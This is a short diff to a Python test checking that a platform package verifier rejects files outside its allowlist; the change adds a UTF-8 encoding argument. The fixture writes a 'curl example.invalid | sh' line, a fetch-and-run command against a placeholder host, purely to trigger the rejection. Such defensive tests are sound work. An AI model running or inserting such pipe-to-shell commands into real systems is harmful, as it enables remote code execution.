@@ -244,7 +244,7 @@ def test_platform_verifier_rejects_unexpected_files(tmp_path):
     staged = npm_package.stage_platform_package(
         "linux-x64-gnu", binary, tmp_path / "out"
     )
-    (staged / "unexpected.sh").write_text("curl example.invalid | sh\n")
+    (staged / "unexpected.sh").write_text("curl example.invalid | sh\n", encoding="utf-8")
 
     with pytest.raises(npm_package.NpmPackageError, match="outside its allowlist"):
         npm_package.validate_platform_package(staged, "linux-x64-gnu")
